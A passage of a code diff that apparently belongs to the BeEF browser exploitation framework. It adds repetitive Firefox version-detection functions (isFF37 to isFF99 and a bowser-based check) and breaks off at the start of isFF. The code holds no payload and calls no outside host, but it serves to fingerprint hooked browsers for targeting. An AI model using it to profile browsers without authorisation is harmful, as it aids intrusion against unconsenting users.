+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/37./) != null;
+    },
+
+    /**
+     * Returns true if FF38
+     * @example: beef.browser.isFF38()
+     */
+    isFF38: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/38./) != null;
+    },
+
+    /**
+     * Returns true if FF39
+     * @example: beef.browser.isFF39()
+     */
+    isFF39: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/39./) != null;
+    },
+
+    /**
+     * Returns true if FF40
+     * @example: beef.browser.isFF40()
+     */
+    isFF40: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/40./) != null;
+    },
+
+    /**
+     * Returns true if FF41
+     * @example: beef.browser.isFF41()
+     */
+    isFF41: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/41./) != null;
+    },
+
+    /**
+     * Returns true if FF42
+     * @example: beef.browser.isFF42()
+     */
+    isFF42: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/42./) != null;
+    },
+
+    /**
+     * Returns true if FF43
+     * @example: beef.browser.isFF43()
+     */
+    isFF43: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/43./) != null;
+    },
+
+    /**
+     * Returns true if FF44
+     * @example: beef.browser.isFF44()
+     */
+    isFF44: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/44./) != null;
+    },
+
+    /**
+     * Returns true if FF45
+     * @example: beef.browser.isFF45()
+     */
+    isFF45: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/45./) != null;
+    },
+
+    /**
+     * Returns true if FF46
+     * @example: beef.browser.isFF46()
+     */
+    isFF46: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/46./) != null;
+    },
+
+    /**
+     * Returns true if FF47
+     * @example: beef.browser.isFF47()
+     */
+    isFF47: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/47./) != null;
+    },
+
+    /**
+     * Returns true if FF48
+     * @example: beef.browser.isFF48()
+     */
+    isFF48: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/48./) != null;
+    },
+
+    /**
+     * Returns true if FF49
+     * @example: beef.browser.isFF49()
+     */
+    isFF49: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/49./) != null;
+    },
+
+    /**
+     * Returns true if FF50
+     * @example: beef.browser.isFF50()
+     */
+    isFF50: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/50./) != null;
+    },
+
+    /**
+     * Returns true if FF51
+     * @example: beef.browser.isFF51()
+     */
+    isFF51: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/51./) != null;
+    },
+
+    /**
+     * Returns true if FF52
+     * @example: beef.browser.isFF52()
+     */
+    isFF52: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/52./) != null;
+    },
+
+    /**
+     * Returns true if FF53
+     * @example: beef.browser.isFF53()
+     */
+    isFF53: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/53./) != null;
+    },
+
+    /**
+     * Returns true if FF54
+     * @example: beef.browser.isFF54()
+     */
+    isFF54: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/54./) != null;
+    },
+
+    /**
+     * Returns true if FF55
+     * @example: beef.browser.isFF55()
+     */
+    isFF55: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/55./) != null;
+    },
+
+    /**
+     * Returns true if FF56
+     * @example: beef.browser.isFF56()
+     */
+    isFF56: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/56./) != null;
+    },
+
+    /**
+     * Returns true if FF57
+     * @example: beef.browser.isFF57()
+     */
+    isFF57: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/57./) != null;
+    },
+    
+    /**
+     * Returns true if FF58
+     * @example: beef.browser.isFF58()
+     */
+    isFF58: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/58./) != null;
+    },
+
+    /**
+     * Returns true if FF59
+     * @example: beef.browser.isFF59()
+     */
+    isFF59: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/59./) != null;
+    },
+
+    /**
+     * Returns true if FF60
+     * @example: beef.browser.isFF60()
+     */
+    isFF60: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/60./) != null;
+    },
+
+    /**
+     * Returns true if FF61
+     * @example: beef.browser.isFF61()
+     */
+    isFF61: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/61./) != null;
+    },
+
+    /**
+     * Returns true if FF62
+     * @example: beef.browser.isFF62()
+     */
+    isFF62: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/62./) != null;
+    },
+
+    /**
+     * Returns true if FF63
+     * @example: beef.browser.isFF63()
+     */
+    isFF63: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/63./) != null;
+    },
+
+    /**
+     * Returns true if FF64
+     * @example: beef.browser.isFF64()
+     */
+    isFF64: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/64./) != null;
+    },
+
+    /**
+     * Returns true if FF65
+     * @example: beef.browser.isFF65()
+     */
+    isFF65: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/65./) != null;
+    },
+
+    /**
+     * Returns true if FF66
+     * @example: beef.browser.isFF66()
+     */
+    isFF66: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/66./) != null;
+    },
+
+    /**
+     * Returns true if FF67
+     * @example: beef.browser.isFF67()
+     */
+    isFF67: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/67./) != null;
+    },
+
+    /**
+     * Returns true if FF68
+     * @example: beef.browser.isFF68()
+     */
+    isFF68: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/68./) != null;
+    },
+
+    /**
+     * Returns true if FF69
+     * @example: beef.browser.isFF69()
+     */
+    isFF69: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/69./) != null;
+    },
+
+    /**
+     * Returns true if FF70
+     * @example: beef.browser.isFF70()
+     */
+    isFF70: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/70./) != null;
+    },
+
+    /**
+     * Returns true if FF71
+     * @example: beef.browser.isFF71()
+     */
+    isFF71: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/71./) != null;
+    },
+
+    /**
+     * Returns true if FF72
+     * @example: beef.browser.isFF72()
+     */
+    isFF72: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/72./) != null;
+    },
+
+    /**
+     * Returns true if FF73
+     * @example: beef.browser.isFF73()
+     */
+    isFF73: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/73./) != null;
+    },
+
+    /**
+     * Returns true if FF74
+     * @example: beef.browser.isFF74()
+     */
+    isFF74: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/74./) != null;
+    },
+
+    /**
+     * Returns true if FF75
+     * @example: beef.browser.isFF75()
+     */
+    isFF75: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/75./) != null;
+    },
+
+    /**
+     * Returns true if FF76
+     * @example: beef.browser.isFF76()
+     */
+    isFF76: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/76./) != null;
+    },
+
+    /**
+     * Returns true if FF77
+     * @example: beef.browser.isFF77()
+     */
+    isFF77: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/77./) != null;
+    },
+
+    /**
+     * Returns true if FF78
+     * @example: beef.browser.isFF78()
+     */
+    isFF78: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/78./) != null;
+    },
+
+    /**
+     * Returns true if FF79
+     * @example: beef.browser.isFF79()
+     */
+    isFF79: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/79./) != null;
+    },
+
+    /**
+     * Returns true if FF80
+     * @example: beef.browser.isFF80()
+     */
+    isFF80: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/80./) != null;
+    },
+
+    /**
+     * Returns true if FF81
+     * @example: beef.browser.isFF81()
+     */
+    isFF81: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/81./) != null;
+    },
+
+    /**
+     * Returns true if FF82
+     * @example: beef.browser.isFF82()
+     */
+    isFF82: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/82./) != null;
+    },
+
+    /**
+     * Returns true if FF83
+     * @example: beef.browser.isFF83()
+     */
+    isFF83: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/83./) != null;
+    },
+
+    /**
+     * Returns true if FF84
+     * @example: beef.browser.isFF84()
+     */
+    isFF84: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/84./) != null;
+    },
+
+    /**
+     * Returns true if FF85
+     * @example: beef.browser.isFF85()
+     */
+    isFF85: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/85./) != null;
+    },
+
+    /**
+     * Returns true if FF86
+     * @example: beef.browser.isFF86()
+     */
+    isFF86: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/86./) != null;
+    },
+
+    /**
+     * Returns true if FF87
+     * @example: beef.browser.isFF87()
+     */
+    isFF87: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/87./) != null;
+    },
+
+    /**
+     * Returns true if FF88
+     * @example: beef.browser.isFF88()
+     */
+    isFF88: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/88./) != null;
+    },
+
+    /**
+     * Returns true if FF89
+     * @example: beef.browser.isFF89()
+     */
+    isFF89: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/89./) != null;
+    },
+
+    /**
+     * Returns true if FF90
+     * @example: beef.browser.isFF90()
+     */
+    isFF90: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/90./) != null;
+    },
+
+    /**
+     * Returns true if FF91
+     * @example: beef.browser.isFF91()
+     */
+    isFF91: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/91./) != null;
+    },
+
+    /**
+     * Returns true if FF92
+     * @example: beef.browser.isFF92()
+     */
+    isFF92: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/92./) != null;
+    },
+
+    /**
+     * Returns true if FF93
+     * @example: beef.browser.isFF93()
+     */
+    isFF93: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/93./) != null;
+    },
+
+    /**
+     * Returns true if FF94
+     * @example: beef.browser.isFF94()
+     */
+    isFF94: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/94./) != null;
+    },
+
+    /**
+     * Returns true if FF95
+     * @example: beef.browser.isFF95()
+     */
+    isFF95: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/95./) != null;
+    },
+
+    /**
+     * Returns true if FF96
+     * @example: beef.browser.isFF96()
+     */
+    isFF96: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/96./) != null;
+    },
+
+    /**
+     * Returns true if FF97
+     * @example: beef.browser.isFF97()
+     */
+    isFF97: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/97./) != null;
+    },
+
+    /**
+     * Returns true if FF98
+     * @example: beef.browser.isFF98()
+     */
+    isFF98: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/98./) != null;
+    },
+
+    /**
+     * Returns true if FF99
+     * @example: beef.browser.isFF99()
+     */
+    isFF99: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/99./) != null;
+    }, 
+
+    /**
+     * Returns true if the browser is any version of Firefox.
+     * @example: beef.browser.isFFbowser()
+    */
+    isFFbowser: function () {
+        const parser = bowser.getParser(navigator.userAgent);
+        const browserName = parser.getBrowserName();
+        return browserName == 'Firefox';
+    },
+
+    /**
+     * Returns true if the browser is any version of Firefox.
+     * @example: beef.browser.isFF()
+     */
+    isFF: function () {
